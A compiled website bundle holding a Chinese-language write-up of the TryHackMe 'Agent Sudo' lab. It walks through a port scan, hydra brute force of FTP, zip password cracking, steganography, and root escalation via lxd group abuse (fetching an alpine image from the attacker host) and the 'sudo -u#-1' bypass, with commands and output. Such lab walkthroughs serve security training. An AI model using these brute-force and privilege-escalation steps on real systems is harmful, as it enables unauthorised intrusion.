"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8935],{51100:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>l,contentTitle:()=>o,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>c});var a=t(74848),s=t(28453);const i={sidebar_position:10,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u9690\u5199\u672f","\u5bc6\u7801\u5b66","lxd \u7528\u6237\u7ec4","SUDO"],title:"Agent Sudo",sidebar_label:"Agent Sudo"},o="Agent Sudo",r={id:"box/TryHackMe/10",title:"Agent Sudo",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/TryHackMe/10.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/10",permalink:"/docs/box/TryHackMe/10",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"\u9690\u5199\u672f",permalink:"/docs/tags/\u9690\u5199\u672f"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"lxd \u7528\u6237\u7ec4",permalink:"/docs/tags/lxd-\u7528\u6237\u7ec4"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:10,frontMatter:{sidebar_position:10,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u9690\u5199\u672f","\u5bc6\u7801\u5b66","lxd \u7528\u6237\u7ec4","SUDO"],title:"Agent Sudo",sidebar_label:"Agent Sudo"},sidebar:"boxSidebar",previous:{title:"Bounty Hacker",permalink:"/docs/box/TryHackMe/9"},next:{title:"Overpass",permalink:"/docs/box/TryHackMe/11"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"FTP",id:"ftp",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"james",id:"james",level:3},{value:"james --&gt; root",id:"james----root",level:3}];function d(n){const e={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...n.components},{Details:t}=e;return t||function(n,e){throw new Error("Expected "+(e?"component":"object")+" `"+n+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.h1,{id:"agent-sudo",children:"Agent Sudo"}),"\n",(0,a.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-168-203:~# rustscan -a 10.10.218.9 -u 5000 -t 1000 -p 21,22,80 -- -sTCV\nPORT   STATE SERVICE REASON  VERSION\n21/tcp open  ftp     syn-ack vsftpd 3.0.3\n22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r\n|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=\n|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt\n80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Annoucement\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,a.jsx)(e.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112322.png",alt:"20240527112322"})}),"\n",(0,a.jsx)(e.p,{children:"\u6839\u636e\u5185\u5bb9\u6211\u4eec\u9700\u8981\u5728 User-agent \u6307\u5b9a\u81ea\u5df1\u7684\u4ee3\u53f7\u6765\u4f5c\u4e3a\u4e00\u4e2a\u77e5\u8bc6\uff0c \u6211\u4eec\u5148\u4f7f\u7528 R \u6765\u6d4b\u8bd5"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112331.png",alt:"20240527112331"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4eec\u4f7f\u7528 Burp \u6293\u5305\u8fdb\u884c\u679a\u4e3e\uff0c \u53d1\u73b0\u51e0\u4e2a\u5f02\u5e38\u4e4b\u5904"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112355.png",alt:"20240527112355"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4eec\u4f7f\u7528 C  \u6765\u8bbf\u95ee\uff0c \u53d1\u73b0"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112405.png",alt:"20240527112405"})}),"\n",(0,a.jsx)(e.admonition,{title:"\u6536\u96c6\u4fe1\u606f",type:"note",children:(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:"\u4e00\u4e2a\u7528\u6237 \uff1a chris"}),"\n",(0,a.jsx)(e.li,{children:"\u5f31\u5bc6\u7801"}),"\n",(0,a.jsx)(e.li,{children:"\u8ba9\u6211\u4eec\u544a\u8bc9\u7279\u5de5 J  \u7684\u5185\u5bb9\uff0c \u4f46\u662f\u5f53 user-agent \u4e3a J  \u65f6\uff0c \u5e76\u6ca1\u6709\u4ec0\u4e48\u8f93\u51fa"}),"\n"]})}),"\n",(0,a.jsx)(e.h2,{id:"ftp",children:"FTP"}),"\n",(0,a.jsx)(e.p,{children:"\u4f7f\u7528\u83b7\u53d6\u5230\u7684\u4fe1\u606f\u7834\u89e3 FTP \u8d26\u53f7"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-168-203:~# hydra -l chris -P `locate rockyou.txt` ftp://10.10.218.9\nHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (http://www.thc.org/thc-hydra) starting at 2023-08-03 04:14:57\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task\n[DATA] attacking ftp://10.10.218.9:21/\n[21][ftp] host: 10.10.218.9   login: chris   password: crystal\n1 of 1 target successfully completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2023-08-03 04:15:56\n"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112508.png",alt:"20240527112508"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4eec\u5c06\u5176\u4e0b\u8f7d\u672c\u5730\uff0c \u4ece txt \u6587\u4ef6\u4e2d\uff0c \u6211\u4eec\u77e5\u9053\u5bc6\u7801\u9690\u5199\u5728\u56fe\u7247\u4e2d"}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4eec\u4f7f\u7528 binwalk \u67e5\u770b\u8fd9\u4e2a\u5bf9\u5e94\u7684\u56fe\u7247\uff0c \u6211\u4eec\u53d1\u73b0\u4e00\u4e2a txt \u6587\u4ef6\uff0c \u6211\u4eec\u5c06\u5176\u63d0\u53d6\u51fa\u6765"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112525.png",alt:"20240527112525"})}),"\n",(0,a.jsx)(e.p,{children:"\u4f46\u662f\u8fd9\u4e2a\u5bf9\u5e94\u7684 To_agentR.txt \u6587\u4ef6\u4e3a\u7a7a\uff0c \u6211\u4eec\u53c8\u53d1\u73b0\u4e00\u4e2a 8702.zip \u6587\u4ef6\uff0c \u53d1\u73b0\u5176\u4e2d\u538b\u7f29\u7684\u6b63\u662f To_agentR.txt  \u6211\u4eec\u5c06\u5176\u89e3\u538b\u83b7\u53d6\uff0c \u4f46\u662f\u9700\u8981\u5bc6\u7801"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112536.png",alt:"20240527112536"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4eec\u4f7f\u7528 john \u8fdb\u884c\u5bc6\u7801\u7834\u89e3"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'root@ip-10-10-168-203:~/_cutie.png.extracted# zip2john 8702.zip  > hash.txt\nroot@ip-10-10-168-203:~/_cutie.png.extracted# john hash.txt --wordlist=`locate rockyou.txt`\nWarning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"\nUse the "--format=ZIP-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nalien            (8702.zip/To_agentR.txt)\n1g 0:00:00:02 DONE (2023-08-03 04:30) 0.3676g/s 9035p/s 9035c/s 9035C/s merlina..280690\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed.\n'})}),"\n",(0,a.jsx)(e.p,{children:"\u89e3\u538b\u6211\u4eec\u7684\u6587\u4ef6\u83b7\u53d6\u76ee\u6807\u6587\u4ef6"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-168-203:~/_cutie.png.extracted# cat To_agentR.txt \nAgent C,\n\nWe need to send the picture to 'QXJlYTUx' as soon as possible!\n\nBy,\nAgent R\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u770b\u4e86 WP   \u540e\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a base64 \u52a0\u5bc6\u5185\u5bb9"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112609.png",alt:"20240527112609"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4eec\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u4f5c\u4e3a\u63d0\u53d6\u53e6\u4e00\u4e2a\u56fe\u7247\u4fe1\u606f\u7684\u5bc6\u7801"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112621.png",alt:"20240527112621"})}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-168-203:~# cat message.txt \nHi james,\n\nGlad you find this message. Your login password is hackerrules!\n\nDon't ask me why the password look cheesy, ask agent R who set this password for you.\n\nYour buddy,\nchris\n"})}),"\n",(0,a.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(e.h3,{id:"james",children:"james"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112646.png",alt:"20240527112646"})}),"\n",(0,a.jsx)(e.h3,{id:"james----root",children:"james --\x3e root"}),"\n",(0,a.jsxs)(e.p,{children:["\u6211\u4eec\u6267\u884c ",(0,a.jsx)(e.code,{children:"sudo -l"})," \u53d1\u73b0\u5176\u7279\u6b8a\u6743\u9650"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112705.png",alt:"20240527112705"})}),"\n",(0,a.jsxs)(t,{children:[(0,a.jsx)("summary",{children:"\ud83d\udca1 \u601d\u8def\u4e00"}),(0,a.jsx)(e.p,{children:"\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u7528\u6237\u662f\u4e00\u4e2a lxd \u7ec4\u7528\u6237"}),(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240527112748.png",alt:"20240527112748"})}),(0,a.jsx)(e.p,{children:"\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u5bf9\u5e94 payload \u8fdb\u884c\u6267\u884c"}),(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-168-203:~# git clone https://github.com/saghul/lxd-alpine-builder.git\nCloning into 'lxd-alpine-builder'...\nremote: Enumerating objects: 50, done.\nremote: Counting objects: 100% (8/8), done.\nremote: Compressing objects: 100% (6/6), done.\nremote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42\nUnpacking objects: 100% (50/50), done.\nroot@ip-10-10-168-203:~# cd lxd\nbash: cd: lxd: No such file or directory\nroot@ip-10-10-168-203:~# cd lxd-alpine-builder/\nroot@ip-10-10-168-203:~/lxd-alpine-builder# ls\nalpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md\n"})}),(0,a.jsx)(e.p,{children:"\u5c06\u5176\u4e0a\u4f20\u5230\u76ee\u6807\u8fdb\u884c\u6267\u884c"}),(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"james@agent-sudo:/tmp$ wget http://10.10.168.203:8000/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz\n--2023-08-03 04:18:07--  http://10.10.168.203:8000/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz\nConnecting to 10.10.168.203:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3259593 (3.1M) [application/gzip]\nSaving to: \u2018alpine-v3.13-x86_64-20210218_0139.tar.gz\u2019\n\nalpine-v3.13-x86_64-20210218_0139.t 100%[================================================================>]   3.11M  --.-KB/s    in 0.01s   \n\n2023-08-03 04:18:07 (276 MB/s) - \u2018alpine-v3.13-x86_64-20210218_0139.tar.gz\u2019 saved [3259593/3259593]\n\njames@agent-sudo:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage\nIf this is your first time running LXD on this machine, you should also run: lxd init\nTo start your first container, try: lxc launch ubuntu:18.04\n\nImage imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b\njames@agent-sudo:/tmp$ lxc image list\n+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\n|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |\n+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\n| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Aug 3, 2023 at 4:18am (UTC) |\n+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+\njames@agent-sudo:/tmp$ lxc storage create my-storage-pool dir\nStorage pool my-storage-pool created\njames@agent-sudo:/tmp$ lxc init myimage ignite -c security.privileged=true -s my-storage-pool\nCreating ignite\n\nThe container you are starting doesn't have any network attached to it.\nTo create a new network, use: lxc network create\nTo attach a network to a container, use: lxc network attach\n\njames@agent-sudo:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\nDevice mydevice added to ignite\njames@agent-sudo:/tmp$ lxc start ignite\njames@agent-sudo:/tmp$ lxc exec ignite /bin/sh\n~ # id\nuid=0(root) gid=0(root)\n~ # cd /mnt\n/mnt # ls\nroot\n/mnt # cd root\n/mnt/root # ls\nbin             etc             lib             mnt             run             swap.img        var\nboot            home            lib64           opt             sbin            sys             vmlinuz\ncdrom           initrd.img      lost+found      proc            snap            tmp             vmlinuz.old\ndev             initrd.img.old  media           root            srv             usr\n"})})]}),"\n",(0,a.jsxs)(t,{children:[(0,a.jsx)("summary",{children:"\ud83d\udca1 \u601d\u8def\u4e8c"}),(0,a.jsx)(e.p,{children:"\u53d1\u73b0\u5bf9\u5e94\u7684 sudo \u5b58\u5728\u6743\u9650\u63d0\u5347\u6f0f\u6d1e"}),(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"james@agent-sudo:/tmp$ sudo -V\nSudo version 1.8.21p2\nSudoers policy plugin version 1.8.21p2\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.21p2\njames@agent-sudo:/tmp$ sudo -u#-1 /bin/bash -p\n[sudo] password for james: \nroot@agent-sudo:/tmp# id\nuid=0(root) gid=1000(james) groups=1000(james)\n"})})]})]})}function p(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(d,{...n})}):d(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>o,x:()=>r});var a=t(96540);const s={},i=a.createContext(s);function o(n){const e=a.useContext(i);return a.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function r(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:o(n.components),a.createElement(i.Provider,{value:e},n.children)}}}]);